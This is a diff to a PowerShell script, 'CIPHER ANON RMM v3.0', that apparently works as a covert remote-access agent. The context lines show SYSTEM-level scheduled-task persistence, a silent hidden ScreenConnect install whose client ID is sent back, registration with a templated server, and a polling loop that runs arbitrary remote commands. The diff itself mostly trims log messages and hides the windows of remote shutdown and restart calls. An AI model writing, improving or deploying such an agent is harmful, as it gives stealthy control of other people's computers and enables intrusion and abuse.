@@ -1,5 +1,5 @@
 # ============================================================
-# CIPHER ANON RMM v3.0 — CLEAN FIXED VERSION
+# CIPHER ANON RMM v3.0 — WORKING FIXED VERSION
 # ============================================================
 
 $BASE_URL = "{{BASE_URL}}"
@@ -54,7 +54,7 @@ function Install-Persistence {
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
         Write-Log "Scheduled task created"
     } catch {
-        Write-Log "Failed to create scheduled task: $_"
+        Write-Log "Failed to create scheduled task"
     }
 }
 
@@ -79,11 +79,11 @@ function Execute-Command {
             Write-Log "Installing ScreenConnect..."
             Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
             Remove-Item $installer -Force -ErrorAction SilentlyContinue
-            $result = "ScreenConnect installed successfully"
+            $result = "ScreenConnect installed"
             try {
                 $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                 if ($scId) {
-                    $result = "ScreenConnect installed — Client ID: $($scId.ClientID)"
+                    $result = "ScreenConnect installed - Client ID: " + $scId.ClientID
                 }
             } catch {}
         } else {
@@ -97,9 +97,9 @@ function Execute-Command {
         try {
             Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
             Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
-            $result = "RMM uninstalled successfully"
+            $result = "RMM uninstalled"
         } catch {
-            $result = "Failed to uninstall: $_"
+            $result = "Failed to uninstall"
             $success = $false
         }
         return @{ success = $success; result = $result }
@@ -121,14 +121,14 @@ function Execute-Command {
     }
 
     if ($Command -like "restart") {
-        $result = "Restarting system..."
-        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'"
+        $result = "Restarting system"
+        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c Remote restart" -WindowStyle Hidden
         return @{ success = $true; result = $result }
     }
 
     if ($Command -like "shutdown") {
-        $result = "Shutting down system..."
-        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'"
+        $result = "Shutting down system"
+        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c Remote shutdown" -WindowStyle Hidden
         return @{ success = $true; result = $result }
     }
 
@@ -137,7 +137,7 @@ function Execute-Command {
         $result = $output
         $success = $true
     } catch {
-        $result = "Unknown command or error: $_"
+        $result = "Unknown command"
         $success = $false
     }
 
@@ -173,10 +173,10 @@ try {
     $resp.Close()
     Write-Log "Registered with server"
 } catch {
-    Write-Log "Registration failed: $_"
+    Write-Log "Registration failed"
 }
 
-Write-Log "Starting RMM background loop..."
+Write-Log "Starting RMM background loop"
 $scriptBlock = {
     $BASE_URL = "{{BASE_URL}}"
     $RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
@@ -227,7 +227,7 @@ $scriptBlock = {
                 try {
                     $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                     if ($scId) {
-                        $result = "ScreenConnect — Client ID: $($scId.ClientID)"
+                        $result = "ScreenConnect - Client ID: " + $scId.ClientID
                     }
                 } catch {}
             } else {
@@ -243,7 +243,7 @@ $scriptBlock = {
                 Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
                 $result = "Uninstalled"
             } catch {
-                $result = "Failed: $_"
+                $result = "Failed"
                 $success = $false
             }
             return @{ success = $success; result = $result }
@@ -265,14 +265,14 @@ $scriptBlock = {
         }
 
         if ($Command -like "restart") {
-            $result = "Restarting..."
-            Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'"
+            $result = "Restarting"
+            Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c Remote restart" -WindowStyle Hidden
             return @{ success = $true; result = $result }
         }
 
         if ($Command -like "shutdown") {
-            $result = "Shutting down..."
-            Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'"
+            $result = "Shutting down"
+            Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c Remote shutdown" -WindowStyle Hidden
             return @{ success = $true; result = $result }
         }
 
@@ -281,7 +281,7 @@ $scriptBlock = {
             $result = $output
             $success = $true
         } catch {
-            $result = "Error: $_"
+            $result = "Error"
             $success = $false
         }
 
@@ -351,7 +351,7 @@ $scriptBlock = {
                 }
             }
         } catch {
-            Write-Log "Loop error: $_"
+            Write-Log "Loop error"
         }
         Start-Sleep -Milliseconds $POLL_INTERVAL
     }
@@ -362,7 +362,7 @@ Write-Log "RMM client running"
 
 Write-Log ""
 Write-Log "============================================"
-Write-Log "RMM CLIENT READY!"
+Write-Log "RMM CLIENT READY"
 Write-Log "Client ID: $clientId"
 Write-Log "Log saved to: $RMM_LOGFILE"
 Write-Log "============================================"
